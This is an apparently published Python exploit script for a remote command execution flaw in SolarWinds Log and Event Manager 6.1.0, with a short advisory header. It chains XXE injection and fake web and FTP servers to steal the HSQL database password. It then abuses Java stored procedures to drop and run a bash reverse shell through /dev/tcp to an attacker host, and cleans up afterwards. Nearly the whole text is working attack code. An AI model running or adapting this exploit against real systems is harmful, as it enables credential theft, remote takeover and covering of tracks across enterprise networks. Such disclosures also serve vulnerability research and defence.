'''
Exploit Title: Solarwinds Log and Event Manager/Trigeo SIM Remote Command Execution
Exploit Author: Chris Graham / @cgrahamseven
Date Discovered: August 10, 2015
Vendor Homepage: http://www.solarwinds.com/ 
Version: 6.1.0 
Tested On: Ubuntu 14.04
Software Link: http://downloads.solarwinds.com/solarwinds/Release/LEM/SolarWinds-LEM-v6.1.0-Evaluation-VMware.exe 
Details: Solarwinds Log and Event Manager is vulnerable to an XML external entity injection 
through the agent message processing service. This service listens on TCP port 37891. Using 
a crafted XML message, an attacker can trigger the vulnerability and force the disclosure of 
arbitrary files on the appliance. This vulnerability can be abused to allow remote execution 
of arbitrary system commands, which will lead to complete compromise of the LEM appliance and 
furthermore lead to full control of any connected endpoint agents that may be deployed 
throughout the enterprise. 
'''
from lib.hsql import HSQLClient
import argparse
import threading
import Queue
import SocketServer
import socket
import ssl
import struct
import re
import time

class FakeWebServer(SocketServer.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, bind_and_activate, ftp_ip):
        self.ftp_ip = ftp_ip
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate=True)

class FakeWebServerHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        # We don't check the request, just always send the dtd
        http_req = b''
        while b'\r\n\r\n' not in http_req:
            http_req += self.request.recv(4096)
        # We can't use http/https handlers because the file will cause a MalformedURLException
        # Instead, we send it as the PASS command argument to our fake ftp server
        dtd = '''<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % boomgoesthedynamite "<!ENTITY sendcreds SYSTEM 'ftp://ownme:%payload;@''' + self.server.ftp_ip + '''/thanks'>">
%boomgoesthedynamite;'''
        headers = ('''HTTP/1.0 200 OK\r\n'''
        '''Content-Type: text/xml\r\n\r\n''')
        self.request.sendall(headers.encode('ascii'))
        self.request.sendall(dtd)

class FakeFTPServer(SocketServer.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, bind_and_activate, message_queue):
        self.message_queue = message_queue
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate=True)

class FakeFTPServerHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        # Send the FTP hello message first
        self.request.sendall("220 FTP Server Ready\r\n")
        ftp_req = b''
        while b'USER ' not in ftp_req:
            ftp_req += self.request.recv(4096)
        self.request.sendall("331 Password Required\r\n")
        while b'PASS ' not in ftp_req:
            ftp_req += self.request.recv(4096)
        match = re.search("hsql_sa_password=(.*)", ftp_req)
        if match:
            self.server.message_queue.put(match.group(1))

def trigger_reverse_shell(hsql_host, sa_password, reverse_shell_host, reverse_shell_port):
    # Create a function that allows us to call a public static method. To abuse openBrowser
    # below, we have to call setProperty and set h2.browser to our own binary.
    set_prop_func = "CREATE FUNCTION my_set_property(k VARCHAR(100), v VARCHAR(100))\r" + \
    "RETURNS VARCHAR(100)\r" + \
    "LANGUAGE JAVA DETERMINISTIC NO SQL\r" + \
    "EXTERNAL NAME 'CLASSPATH:java.lang.System.setProperty'"
    # A procedure is required to execute a public static method that returns no value
    # We will abuse the openBrowser method in Server.class within the h2-1.3.174.jar file
    # that is included in the classpath by the trigeo java process. openBrowser calls
    # Runtime.getRuntime().exec and can be tricked into executing our own command instead
    # of a browser.
    exec_param_proc = "CREATE PROCEDURE my_exec_params(IN args VARCHAR(100))\r" + \
    "LANGUAGE JAVA\r" + \
    "EXTERNAL NAME 'CLASSPATH:org.h2.tools.Server.openBrowser'"
    hsql_cli = HSQLClient(hsql_host, 9001, "sa", sa_password, "alertdb")
    hsql_cli.connect()
    ## Create the functions
    hsql_cli.single_query(set_prop_func)
    hsql_cli.single_query(exec_param_proc)
    ## Now drop the bash reverse shell script (will land in /var/alertdb/hsql)
    hsql_cli.single_query("CREATE TABLE bash_shell(script VARCHAR(100))")
    hsql_cli.single_query("INSERT INTO bash_shell(script) VALUES ('0<&196;exec 196<>/dev/tcp/" + str(reverse_shell_host) + "/" + str(reverse_shell_port) + "; sh <&196 >&196 2>&196')")
    hsql_cli.single_query("CREATE TEXT TABLE export (LIKE bash_shell)")
    hsql_cli.single_query("SET TABLE export SOURCE 'pwned.sh;all_quoted=false'")
    hsql_cli.single_query("INSERT INTO export (SELECT script FROM bash_shell)")
    hsql_cli.single_query("DROP TABLE export")
    hsql_cli.single_query("DROP TABLE bash_shell")
    # Finally, exec the bash script and grab our shell
    hsql_cli.single_query("CALL my_set_property('h2.browser', 'bash')")
    hsql_cli.single_query("CALL my_exec_params('/var/alertdata/hsql/pwned.sh')")
    # Delete the leftover shell script
    hsql_cli.single_query("CALL my_set_property('h2.browser', 'rm')")
    hsql_cli.single_query("CALL my_exec_params('/var/alertdata/hsql/pwned.sh')")
    # Remove our stored procedures
    hsql_cli.single_query("DROP FUNCTION my_set_property")
    hsql_cli.single_query("DROP PROCEDURE my_exec_params")
    hsql_cli.close()

def exploit_xxe(lem_host, local_webserver_ip):
    url = "\"http://%s/hsql_creds.dtd\"" % (local_webserver_ip)
    # The log and event manager fails to disable external entities so we send an agent -> manager
    # hello request to trigger the vulnerability. Fields can be arbitrary in this request.
    xxe_req = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE solr [<!ENTITY % payload SYSTEM "file:///usr/local/contego/run/sqlresources/passwords.data" >
<!ENTITY % dtd SYSTEM ''' + url + '''> %dtd;]>
<ns3:hello xmlns="http://www.solarwinds.com/lem/protocol/1_0/encryptfs" xmlns:ns2="http://www.solarwinds.com/lem/protocol/1_0/fim" xmlns:ns3="http://www.solarwinds.com/lem/protocol/1_0" xmlns:ns4="http://www.solarwinds.com/lem/protocol/1_0/modman" id="6"><ns3:agentId>100000101</ns3:agentId><ns3:properties><ns3:key>protocol.hello.os</ns3:key><ns3:value>Windows 7;6.1;x86</ns3:value></ns3:properties><ns3:properties><ns3:key>protocol.hello.usb_service</ns3:key><ns3:value>false</ns3:value></ns3:properties><ns3:protocolVersion>1.0</ns3:protocolVersion><ns3:releaseVersion>&sendcreds;</ns3:releaseVersion></ns3:hello>'''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
    ssl_sock.connect((lem_host, 37891))
    res = ssl_sock.write(struct.pack(">L", len(xxe_req)) + xxe_req)
    ssl_sock.close()

if __name__ == "__main__":
    cmdline = argparse.ArgumentParser(description="Solarwinds LEM Remote Command Execution")
    cmdline.add_argument('-t', dest='lem_host', help='LEM Appliance IP', required=True)
    cmdline.add_argument('-b', dest='bind_addr', help='Address to bind FTP and Webserver to', required=True)
    cmdline.add_argument('-l', dest='netcat_ip', help='Netcat listener address', required=True)
    cmdline.add_argument('-lp', dest='netcat_port', help='Netcat listener port', required=True)
    args = cmdline.parse_args()
    message_queue = Queue.Queue()
    ftp_server = FakeFTPServer((args.bind_addr, 21), FakeFTPServerHandler, True, message_queue)
    ftp_server_thread = threading.Thread(target=ftp_server.serve_forever)
    ftp_server_thread.daemon = True
    ftp_server_thread.start()
    print "[*]Fake FTP Server started..."
    web_server = FakeWebServer((args.bind_addr, 80), FakeWebServerHandler, True, args.bind_addr)
    web_server_thread = threading.Thread(target=web_server.serve_forever)
    web_server_thread.daemon = True
    web_server_thread.start()
    print "[*]Fake Webserver started..."

    time.sleep(1)
    print "[*]Exploiting XML external entity injection vulnerability..."
    exploit_xxe(args.lem_host, args.bind_addr)
    try:
        hsql_sa_pass = message_queue.get(timeout=10)
    except Queue.Empty:
        print "[-]Failed to retrieve hsql sa password! Exiting..."
        exit()
    print "[+]Successfully retrieved hsql sa password: " + hsql_sa_pass
    time.sleep(1)
    print "[*]Triggering reverse shell. Check netcat listener now."
    trigger_reverse_shell(args.lem_host, hsql_sa_pass, args.netcat_ip, args.netcat_port)

